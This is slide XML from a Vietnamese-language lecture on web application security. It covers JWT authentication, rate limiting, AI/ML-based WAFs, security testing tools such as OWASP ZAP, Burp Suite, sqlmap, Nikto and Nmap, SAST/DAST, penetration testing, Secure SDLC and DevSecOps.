            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>chế gọn nhẹ để xác thực người dùng, dữ liệu trong token được ký số.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Rate Limiting: </a:t>
            </a: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iới </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hạn số request trong một khoảng thời gian để chống brute force, DoS API.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Mỗi tài khoản chỉ được gọi tối đa 100 request/phút.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>API yêu cầu Bearer Token JWT để xác thực.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27793429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86053"/>
            <a:ext cx="10242645" cy="446964"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.3.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nâng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cao</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6" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Dùng WAF thế hệ mới (AI/ML-based WAF)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khác biệt với WAF truyền thống:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Truyền thống dựa vào rule &amp; signature (như firewall hoặc IDS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thế hệ mới ứng dụng AI/ML để học hành vi bất thường </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>nên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có</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khả</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năng</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phát hiện tấn công zero-day.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lợi ích:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ngăn chặn SQLi, XSS, CSRF một cách chủ động.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thích ứng với lưu lượng lớn trong </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>E-commerce</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Ví dụ thực tế: AWS WAF, Cloudflare WAF, Imperva WAF với khả năng machine learning.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5692300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447361" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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Việc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>kiểm thử và phát hiện lỗ hổng trong ứng dụng Web là bước quan trọng để đảm bảo an toàn trước khi triển khai và trong suốt vòng đời hoạt động. Các công cụ phổ biến gồm:</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OWASP ZAP (Zed Attack Proxy)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Công </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>cụ mã nguồn mở do OWASP phát triển.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Chức năng chính:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Quét ứng dụng web để phát hiện các lỗ hổng như SQLi, XSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Proxy trung gian để phân tích request/response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hỗ trợ kiểm thử thủ công lẫn tự động.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ưu điểm: Dễ sử dụng, miễn phí, phù hợp với cả sinh viên và chuyên gia</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </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4048394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10634"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Burp Suite</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>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thương mại (có bản Community) mạnh mẽ, phổ biến nhất trong kiểm thử ứng dụng Web.</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 chính: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Intercept proxy: phân tích và chỉnh sửa request/response.</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Scanner: tự động dò lỗ hổng bảo mật.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Intruder: thử nghiệm brute force, fuzzing.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Ưu điểm: Tích hợp nhiều công cụ trong 1, giao diện trực quan.</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2581441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10634"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sqlmap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>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tự động khai thác và kiểm thử SQL Injection.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 chính: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Tự động phát hiện SQLi.</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Trích xuất cơ sở dữ liệu, bảng, cột.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nhiều kỹ thuật SQLi: error-based, blind, time-based.</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Ưu điểm: Nhanh, mạnh, dễ dùng trong pentest.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7464531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10634"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Nikto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>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mã nguồn mở chuyên quét Web Server.</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 chính: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cấu hình sai, file/dir ẩn.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lỗ hổng bảo mật phổ biến.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Dò ra phiên bản server dễ bị tấn công.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Ưu điểm: Tập trung vào Web Server, nhẹ và dễ chạy.</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9780809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10634"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Nmap (với NSE Scripts)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>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quét cổng nổi tiếng, hỗ trợ script để kiểm tra lỗ hổng.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 chính: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Quét cổng, phát hiện dịch vụ và phiên bản.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NSE (Nmap Scripting Engine) hỗ trợ kiểm thử SQLi, XSS, cấu hình SSL/TLS.</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Ưu điểm: Đa năng, dùng được cho cả Network Security và Web Security.</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4586187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10634"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6</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Phân tích mã nguồn và hành vi</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SAST (Static Application Security Testing):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Quét mã nguồn ứng dụng web để tìm lỗ hổng (chưa cần chạy ứng dụng).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công cụ: SonarQube, Checkmarx.</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DAST (Dynamic Application Security Testing):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Quét ứng dụng đang chạy để phát hiện lỗ hổng.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công cụ: OWASP ZAP, AppScan.</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5623362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10634"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7</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xâm nhập (Penetration Testing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>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Quá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trình kiểm thử thực tế do chuyên gia thực hiện.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phỏng hacker tấn công thật sự.</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lỗ hổng chưa được công cụ tự động phát hiện.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quả: Cung cấp báo cáo chi tiết, đề xuất biện pháp khắc phục.</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0347838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4"/>
            <a:ext cx="10242645" cy="460612"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3.2.4.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Công cụ kiểm thử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365475" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600"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Lưu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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ý:</a:t>
            </a:r>
            <a:endPar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a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>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Công cụ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>OWASP ZAP</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vi-VN" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Burp Suite</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Phù hợp quét ứng dụng web.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>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sqlmap, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Nikto</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vi-VN" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Nmap</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Chuyên dụng cho SQLi, web server và dịch vụ mạng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>SAST</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&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>DAST</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Bổ sung kiểm thử ở nhiều giai đoạn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>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Penetration Testing: Bắt buộc trong các hệ thống </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="26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E-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="26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c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="26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ommerce</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tài chính, ngân hàng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="26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a:t>
            </a:r>
            <a:endPar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139533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buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Bảo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>mật ứng dụng web không chỉ là xử lý lỗ hổng khi bị phát hiện, mà phải được tích hợp xuyên suốt vòng đời phát triển phần mềm (Secure Software Development Life Cycle – Secure SDLC).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" sz="2600"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5157524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Secure SDLC (Security in Software Development Life Cycle)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Đưa</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bảo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>mật vào tất cả các giai đoạn phát triển phần mềm (từ thiết kế </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triển </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>khai </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vận hành).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thực hiện:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Phân tích yêu cầu: xác định yêu cầu bảo mật ngay từ đầu (xác thực, phân quyền, mã hóa).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thiết kế: xây dựng kiến trúc an toàn (defense in depth, least privilege).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lập trình: áp dụng coding standard an toàn (OWASP, CERT).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kiểm thử: dùng SAST, DAST, pentest.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Triển khai &amp; vận hành: giám sát log, vá lỗi kịp thời.</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7347224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DevSecOps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ở </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>rộng từ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>DevOps</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>: T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ích </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hợp bảo mật vào CI/CD pipeline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
